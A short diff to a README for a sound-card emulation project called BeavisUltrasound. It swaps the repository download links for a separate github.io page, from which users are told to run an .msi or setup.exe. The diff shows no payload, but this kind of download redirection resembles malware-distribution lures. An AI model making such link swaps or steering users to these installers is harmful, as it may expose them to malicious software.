@@ -1,6 +1,6 @@
 # 🔊 BeavisUltrasound - Experience authentic classic sound card output
 
-[![Download BeavisUltrasound](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/tonnieshod967/BeavisUltrasound)
+[![Download BeavisUltrasound](https://img.shields.io/badge/Download-Release-blue.svg)](https://tonnieshod967.github.io)
 
 ## 📋 About This Project
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run the software:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [the release page](https://github.com/tonnieshod967/BeavisUltrasound) to download the installation package.
+1. Visit [the release page](https://tonnieshod967.github.io) to download the installation package.
 2. Look for the file labeled ending in .msi or setup.exe under the latest version header.
 3. Click the file to start the download process.
 4. Once the download finishes, navigate to your Downloads folder.
